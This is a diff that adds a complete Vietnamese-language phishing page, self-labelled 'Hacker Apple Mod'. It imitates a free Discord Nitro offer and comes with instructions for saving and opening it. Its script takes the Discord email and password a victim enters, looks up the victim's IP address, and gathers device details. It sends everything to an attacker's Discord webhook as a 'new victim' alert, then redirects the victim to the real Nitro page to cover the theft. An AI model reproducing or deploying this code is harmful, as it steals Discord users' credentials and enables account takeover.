@@ -1,0 +1,199 @@
+<!-- Hacker Apple Mod: Discord Nitro 3 Tháng "Free" - Phishing Page -->
+<!-- Sử dụng: Lưu thành index.html, mở bằng trình duyệt -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Nitro - Nhận 3 Tháng Miễn Phí</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #5865F2, #404EED);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(0,0,0,0.45);
+            backdrop-filter: blur(15px);
+            border-radius: 16px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            width: 380px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .nitro-badge {
+            width: 80px;
+            height: 80px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>') center/contain no-repeat;
+            margin: 0 auto 20px;
+            filter: drop-shadow(0 0 10px #FF73FA);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); filter: drop-shadow(0 0 10px #FF73FA); }
+            50% { transform: scale(1.1); filter: drop-shadow(0 0 25px #FF73FA); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 10px #FF73FA); }
+        }
+        h1 {
+            font-size: 1.8em;
+            margin: 0 0 10px;
+            font-weight: 700;
+        }
+        p {
+            color: #ccc;
+            margin-bottom: 25px;
+            font-size: 0.95em;
+        }
+        .input-group {
+            background: rgba(0,0,0,0.6);
+            border-radius: 8px;
+            padding: 8px 15px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 12px 5px;
+            color: white;
+            font-size: 1em;
+            outline: none;
+            text-align: center;
+        }
+        input::placeholder {
+            color: #aaa;
+            text-align: center;
+        }
+        .btn {
+            background: #FF73FA;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #ff4df7;
+            box-shadow: 0 0 20px #FF73FA;
+            transform: translateY(-2px);
+        }
+        .disclaimer {
+            font-size: 0.7em;
+            color: #888;
+            margin-top: 20px;
+        }
+        #webhook-response {
+            display: none;
+            color: #57F287;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nitro-badge"></div>
+        <h1>3 THÁNG NITRO</h1>
+        <p>Đăng nhập để nhận mã kích hoạt</p>
+
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email Discord" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Mật khẩu" autocomplete="off">
+        </div>
+        <button class="btn" onclick="collect()">NHẬN NGAY</button>
+        <div id="webhook-response">Đang xác minh...</div>
+        <div class="disclaimer">Chỉ áp dụng cho tài khoản chưa từng dùng Nitro</div>
+    </div>
+
+    <script>
+        // ===== CẤU HÌNH WEBHOOK =====
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/THAY_BANG_WEBHOOK_CUA_BAN";
+
+        async function collect() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const resDiv = document.getElementById('webhook-response');
+
+            if (!email || !password) {
+                alert("Vui lòng nhập đầy đủ thông tin!");
+                return;
+            }
+
+            // Lấy IP và thông tin thiết bị
+            let ipData = "";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipJson = await ipRes.json();
+                ipData = ipJson.ip;
+            } catch(e) {
+                ipData = "Không lấy được";
+            }
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timestamp = new Date().toLocaleString("vi-VN");
+
+            // Chuẩn bị payload
+            const embed = {
+                title: "🔴 NẠN NHÂN MỚI - NITRO 3 THÁNG",
+                color: 0xFF73FA,
+                fields: [
+                    { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: true },
+                    { name: "🔑 Mật khẩu", value: `\`\`\`${password}\`\`\``, inline: true },
+                    { name: "🌐 IP", value: `\`\`\`${ipData}\`\`\``, inline: false },
+                    { name: "🖥️ Hệ điều hành", value: `\`\`\`${platform}\`\`\``, inline: true },
+                    { name: "🌍 Trình duyệt", value: `\`\`\`${userAgent.substring(0, 50)}...\`\`\``, inline: true },
+                    { name: "⏰ Thời gian", value: `\`\`\`${timestamp}\`\`\``, inline: false },
+                    { name: "🔧 Độ phân giải", value: `\`\`\`${screenRes}\`\`\``, inline: true },
+                    { name: "🕒 Múi giờ", value: `\`\`\`${timezone}\`\`\``, inline: true },
+                    { name: "🗣️ Ngôn ngữ", value: `\`\`\`${language}\`\`\``, inline: true }
+                ],
+                footer: { text: "Hacker Apple Mod • Không giới hạn" },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                content: "||@everyone|| **NẠN NHÂN MỚI** 🎣",
+                embeds: [embed]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                resDiv.style.display = "block";
+                resDiv.textContent = "✅ Xác minh thành công! Đang chuyển hướng...";
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/nitro";
+                }, 3000);
+            } catch(e) {
+                resDiv.style.display = "block";
+                resDiv.style.color = "#ED4245";
+                resDiv.textContent = "❌ Lỗi kết nối, thử lại sau.";
+            }
+        }
+    </script>
+</body>
+</html>
